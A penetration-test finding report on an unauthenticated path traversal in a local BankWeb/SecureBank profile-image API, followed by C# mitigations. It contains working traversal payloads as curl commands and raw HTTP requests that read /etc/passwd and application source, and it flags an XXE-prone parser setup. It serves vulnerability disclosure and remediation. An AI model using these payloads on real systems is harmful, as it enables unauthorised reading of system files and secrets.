# Issue #11 — Path Traversal in Profile Image API Allows Arbitrary File Read

| Field         | Details                                               |
|---------------|-------------------------------------------------------|
| **Target**    | BankWeb API — `http://localhost:1337/api/User/ProfileImage` |
| **Severity**  | Critical                                              |
| **CVSS v3.1** | 7.5                                                   |
| **Vector**    | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N                  |
| **Category**  | Path Traversal — Arbitrary File Read          |

---

## Summary

The `/api/User/ProfileImage` endpoint accepts a `user` query parameter that is used to construct a file system path for retrieving a user's profile image. The parameter is not validated or sanitised, allowing an attacker to inject directory traversal sequences (`../`) to escape the intended image directory and read arbitrary files from the server's file system.

Critically, the endpoint requires **no authentication** — the traversal is fully exploitable by an anonymous user without any session token. Three exploitation outcomes were confirmed during testing:

- Reading `/etc/passwd` to enumerate system users
- Reading application source code files using paths disclosed via the stack trace in Issue #03
- The endpoint misreports all responses with `Content-Type: image/jpg` regardless of the actual file content, indicating no type validation is performed at any stage

---

## Steps to Reproduce

1. Send a request to the endpoint without any session cookie, substituting the `user` parameter with a traversal sequence targeting a known file:

   ```bash
   # Read /etc/passwd (unauthenticated)
   curl -s "http://localhost:1337/api/User/ProfileImage?user=../../../../etc/passwd"
   ```

2. Observe that the server returns the full contents of `/etc/passwd` with HTTP 200.

3. Using file system paths disclosed by the stack trace in Issue #03, read application source code directly:

   ```bash
   curl -s "http://localhost:1337/api/User/ProfileImage?user=..%2f..%2f..%2f..%2f..%2f..%2fapp%2fServices%2fUploadFileBL.cs"
   ```

4. Observe that the full C# source file is returned in the response body.

---

## Proof of Concept

### Baseline — Legitimate Request

**Request:**

```http
GET /api/User/ProfileImage?user=test@mail.com HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Cookie: SessionId=[REDACTED]
```

**Response:**

```http
HTTP/1.1 200 OK
Content-Length: 939071
Content-Type: image/jpg
Date: Mon, 07 Jul 2025 09:57:20 GMT
Server: Kestrel

PNG
...
```

The endpoint resolves the `user` value to a profile image path on disk and returns the file contents.

---

### PoC 1 — `/etc/passwd` (Unauthenticated)

**Request:**

```http
GET /api/User/ProfileImage?user=../../../../etc/passwd HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36
```

No `Cookie` header is present — this request is fully unauthenticated.

**Response:**

```http
HTTP/1.1 200 OK
Content-Length: 922
Content-Type: image/jpg
Date: Sun, 20 Jul 2025 14:55:29 GMT
Server: Kestrel

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
```

The server returns the full contents of `/etc/passwd`, confirming unauthenticated arbitrary file read. The response is served with `Content-Type: image/jpg` despite being plaintext — confirming that no content-type validation or file extension checking is performed.

---

### PoC 2 — Application Source Code Retrieval

The file system path `/app/Services/UploadFileBL.cs` was obtained from the stack trace disclosed in Issue #03. Using this path, the full source file was retrieved:

**Request:**

```http
GET /api/User/ProfileImage?user=..%2f..%2f..%2f..%2f..%2f..%2fapp%2fServices%2fUploadFileBL.cs HTTP/1.1
Host: localhost:1337
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Cookie: SessionId=[REDACTED]
```

**Response (excerpt):**

```http
HTTP/1.1 200 OK
Content-Length: 1760
Content-Type: image/jpg
Date: Fri, 11 Jul 2025 13:13:27 GMT
Server: Kestrel

using Microsoft.AspNetCore.Http;
using NLog;
using SecureBank.Interfaces;
...
namespace SecureBank.Services
{
    public class UploadFileBL : IUploadFileBL
    {
        ...
        protected virtual string ParseXml(string xml)
        {
            XmlReaderSettings settings = new XmlReaderSettings
            {
                DtdProcessing = DtdProcessing.Parse,
                XmlResolver = new XmlUrlResolver
                {
                    Credentials = CredentialCache.DefaultCredentials,
                }
            };
            ...
        }
    }
}
```

The full source of `UploadFileBL.cs` is returned in plaintext. This source code reveals an additional critical vulnerability: `DtdProcessing` is set to `Parse` and an `XmlUrlResolver` with default credentials is configured, which is the canonical setup for an **XXE (XML External Entity) injection** — to be investigated as a separate finding.

> **Note:** The fact that this source retrieval required a path disclosed by Issue #03 illustrates how multiple lower-severity findings chain into critical impact.

---

## Impact

- **Unauthenticated arbitrary file read** — no session or credentials are required to exploit this vulnerability. Any internet-facing deployment is fully exposed to anonymous attackers.
- **System user enumeration** — `/etc/passwd` exposes all system accounts, their home directories, and default shells. This information is useful for privilege escalation and lateral movement attempts.
- **Full source code disclosure** — using paths leaked via the stack trace (Issue #03), an attacker can retrieve the application's source code, enabling white-box analysis of the entire codebase for additional vulnerabilities without access to the repository.
- **XXE indicator in retrieved source** — the `UploadFileBL.cs` source obtained through this traversal reveals that the XML parser is configured with `DtdProcessing.Parse` and a live `XmlUrlResolver`, a configuration known to enable XXE injection — significantly broadening the potential attack surface.
- **Configuration and secret file exposure** — beyond source code, traversal can target `appsettings.json`, `appsettings.Production.json`, or `.env` files that may contain database connection strings, API keys, or JWT signing secrets.
- **Attack chain** — this finding directly leverages path information disclosed in Issue #03 (stack trace), and the retrieved source code in turn reveals a potential XXE vector. This demonstrates a clear multi-stage attack chain originating from the information disclosure findings.

---

## Recommended Mitigations

1. **Validate and canonicalise the `user` parameter** before using it to construct any file path. Resolve the full path and verify it falls within the expected base directory:

   ```csharp
   var baseDirectory = Path.GetFullPath("/app/images/profiles/");
   var requestedPath = Path.GetFullPath(Path.Combine(baseDirectory, userParam));

   if (!requestedPath.StartsWith(baseDirectory, StringComparison.OrdinalIgnoreCase))
       return Forbid(); // Traversal attempt detected
   ```

2. **Do not use user-supplied input to construct file system paths.** Instead, map usernames to image files via a database lookup or a deterministic, server-controlled naming scheme (e.g. a hash of the user ID), ensuring the file path is never derived from client input.

3. **Enforce authentication on the endpoint.** Profile image retrieval should require a valid session — there is no legitimate reason for this endpoint to be publicly accessible without authentication:

   ```csharp
   [HttpGet("ProfileImage")]
   [Authorize]
   public IActionResult GetProfileImage(string user) { ... }
   ```

4. **Restrict the file serving to an allowed extension list.** Only serve files with image extensions (`.jpg`, `.png`, `.gif`, `.webp`) and validate the actual file content matches the declared type before returning it.

5. **Run the application process with least-privilege file system permissions.** The process should only have read access to the directories it explicitly needs, limiting the blast radius of any traversal that bypasses input validation.